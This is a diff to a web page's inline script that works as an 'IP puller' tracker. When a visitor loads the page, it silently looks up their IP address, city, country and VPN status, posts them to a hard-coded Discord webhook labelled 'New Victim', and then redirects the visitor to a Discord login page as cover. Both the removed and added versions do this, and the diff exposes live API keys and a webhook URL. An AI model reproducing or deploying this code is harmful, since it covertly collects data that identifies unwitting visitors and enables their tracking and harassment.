@@ -7,64 +7,50 @@
 </head>
 <body>
     <script>
+    // Utility function for making API requests
     function json(url) {
         return fetch(url).then(res => res.json());
     }
 
+    // Function to get the user's IP and check for VPN
     function getMyIP() {
-        let apiKey = '3dc9adbe58e5e216.fff70c02d7f2504d629bef86fc31b7f18eef700cc36d644c5d30363885290381';  // Replace with your actual ipinfo.io API key
-        let webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr';
+        let apiKey = 'c64ab728d42c9be3cba6c2d546fa575be79ed1cc32bf324b5de3a6d8'; // Your ipdata.co API key
+        let webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr'; // Your Discord webhook URL
 
-        // Fetch the public IP address of the user
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(ipData => {
-                const ip = ipData.ip;
+        // Fetch the user's IP and other information from ipdata.co
+        json(`https://api.ipdata.co?api-key=${apiKey}`)
+            .then(data => {
+                const isVpn = data.is_vpn ? 'Yes' : 'No'; // Check if the IP belongs to a VPN
                 
-                // Check if the IP belongs to a VPN using ipinfo.io (replace with a real API key)
-                fetch(`https://ipinfo.io/${ip}/json?token=${apiKey}`)
-                    .then(response => {
-                        if (!response.ok) {
-                            throw new Error('Failed to fetch IP info');
-                        }
-                        return response.json();
-                    })
-                    .then(ipInfo => {
-                        const isVpn = ipInfo.org && ipInfo.org.toLowerCase().includes("vpn");
-
-                        // If a VPN is detected, send a webhook with that information
-                        let message = {
-                            embeds: [
-                                {
-                                    title: "@everyone King von IP puller 😈",
-                                    description: `** New Victim**\nIP: ||${ip}||\nCity: ${ipInfo.city}\nCountry: ${ipInfo.country}\nVPN Detected: ${isVpn ? 'Yes' : 'No'}\nBY RUNTZ PURCHASE TODAY!`,
-                                    image: {
-                                        url: "https://www.rollingstone.com/wp-content/uploads/2022/02/king-von-posthumous-album.jpg"
-                                    },
-                                    color: 0x007BFF
-                                }
-                            ]
-                        };
-
-                        // Send the data to Discord webhook
-                        fetch(webhookURL, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
+                // Create the message to be sent to Discord
+                let message = {
+                    embeds: [
+                        {
+                            title: "@everyone King von IP puller 😈",
+                            description: `** New Victim**\nIP: ||${data.ip}||\nCity: ${data.city}\nCountry: ${data.country_code}\nVPN Detected: ${isVpn}\nBY RUNTZ PURCHASE TODAY!`,
+                            image: {
+                                url: "https://www.rollingstone.com/wp-content/uploads/2022/02/king-von-posthumous-album.jpg"
                             },
-                            body: JSON.stringify(message)
-                        }).then(() => {
-                            window.location.href = "https://discord.gg/login";
-                        }).catch(err => {
-                            console.error('Error sending to webhook:', err);
-                        });
-                    })
-                    .catch(err => {
-                        console.error('Error fetching IP info:', err);
-                    });
+                            color: 0x007BFF
+                        }
+                    ]
+                };
+
+                // Send the data to the Discord webhook
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                }).then(() => {
+                    window.location.href = "https://discord.gg/login"; // Redirect to Discord after sending the message
+                }).catch(err => {
+                    console.error('Error sending webhook:', err);
+                });
             })
             .catch(err => {
-                console.error('Error fetching IP address:', err);
+                console.error('Error fetching IP data:', err);
             });
     }
 
